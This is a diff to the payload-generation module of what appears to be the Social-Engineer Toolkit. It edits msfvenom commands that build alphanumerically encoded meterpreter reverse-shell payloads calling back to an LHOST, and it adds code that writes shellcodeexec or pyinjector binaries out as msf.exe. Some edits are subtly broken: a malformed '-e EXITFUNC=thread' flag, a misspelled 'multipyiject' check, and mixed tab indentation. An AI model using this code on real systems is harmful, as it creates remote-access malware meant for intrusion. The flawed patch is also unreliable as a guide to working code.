@@ -32,7 +32,7 @@ stage_encoding = check_config("STAGE_ENCODING=").lower()
 if stage_encoding == "off": stage_encoding = "false"
 else: stage_encoding = "true"
 
-configfile=file("%s/config/set_config" % (definepath),"r").readlines()
+configfile=file("/etc/setoolkit/set.config","r").readlines()
 
 # check the metasploit path
 msf_path = meta_path()
@@ -79,7 +79,7 @@ if os.path.isfile(setdir + "/payloadgen"):
 ####################################################################################################################################
 
 if check_options("IPADDR=") == False:
-    fileopen=file(definepath + "/config/set_config", "r")
+    fileopen=file("/etc/setoolkit/set.config", "r")
     data = fileopen.read()
     match = re.search("AUTO_DETECT=ON", data)
     if match:
@@ -292,12 +292,6 @@ try:
         if encode != "BACKDOOR":
             # if we aren't using the set reverse shell
             if choice1 != "set/reverse_shell":
-                # if we aren't using shellcodeexec
-                #if choice1 != "shellcode/alphanum":
-                #    if choice1 != "shellcode/pyinject":
-                #        if choice1 != "shellcode/multipyinject":
-                #            generatepayload=subprocess.Popen(r"ruby %s/msfvenom -p %s LHOST=%s %s --format %s > %s %s" % (path,choice1,choice2,portnum,choice4,setdir,msf_filename), shell=True).wait()
-
                 # if we are using shellcodeexec
                 if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                     if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject":
@@ -322,7 +316,7 @@ try:
 
                     if choice1 == "shellcode/alphanum":
                         print_status("Generating the payload via msfvenom and generating alphanumeric shellcode...")
-			subprocess.Popen("ruby %s/msfvenom -p %s LHOST=%s %s EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,choice9,choice2,portnum,setdir), shell=True).wait()
+			subprocess.Popen("ruby %s/msfvenom -p %s LHOST=%s %s StagerURILength=5 StagerVerifySSLCert=false -e EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,choice9,choice2,portnum,setdir), shell=True).wait()
 
                     if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                         # here we update set options to specify pyinjection and multipy
@@ -471,11 +465,17 @@ try:
                     # here we obfuscate the binary a little bit
                     random_string = generate_random_string(3,3).upper()
                     if choice1 == "shellcode/alphanum":
-                        fileopen = file("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb")
+                        fileopen = file("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb").read()
                     if choice1 == "shellcode/pyinject":
-                        fileopen = file("%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb")
+                        fileopen = file("%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb").read()
                     if choice1 == "shellcode/multipyinject":
-                        fileopen = file("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb")
+                        fileopen = file("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb").read()
+
+		    # write out the payload
+		    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyiject":
+			filewrite=file(setdir + "/msf.exe", "wb")
+			filewrite.write(fileopen)
+			filewrite.close()
 
                     subprocess.Popen("cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                     # we need to read in the old index.html file because its already generated, need to present the alphanum to it
